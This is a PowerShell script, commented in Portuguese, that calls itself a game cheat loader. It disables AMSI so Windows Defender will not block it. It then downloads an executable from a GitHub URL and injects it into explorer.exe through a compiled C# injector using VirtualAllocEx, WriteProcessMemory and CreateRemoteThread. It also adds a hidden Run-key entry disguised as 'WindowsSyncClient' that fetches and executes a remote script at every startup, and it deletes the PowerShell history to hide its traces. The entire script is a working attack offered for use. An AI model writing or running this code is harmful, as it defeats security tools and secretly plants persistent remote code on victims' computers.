# Bypass do AMSI (para o Defender não matar a injeção)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# URL do seu cheat (ajuste se o link mudar)
$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"

# Baixa o cheat para a memória
$payload = (New-Object System.Net.WebClient).DownloadData($url)

# Código C# para injetar na memória do explorer.exe
$code = @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    public static void Inject(string procName, byte[] payload) {
        var procs = System.Diagnostics.Process.GetProcessesByName(procName);
        if (procs.Length == 0) return;
        IntPtr hProc = OpenProcess(0x1F0FFF, false, procs[0].Id); 
        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
        UIntPtr written;
        WriteProcessMemory(hProc, addr, payload, (uint)payload.Length, out written);
        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[Injector]::Inject("explorer", $payload)

# Persistência (Registra no Run do Windows para reiniciar junto com o PC)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SEU_USUARIO/SEU_REPO/main/sync.ps1')`""
Set-ItemProperty -Path $regPath -Name "WindowsSyncClient" -Value $cmd

# Limpa o histórico do PowerShell para não deixar rastro
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
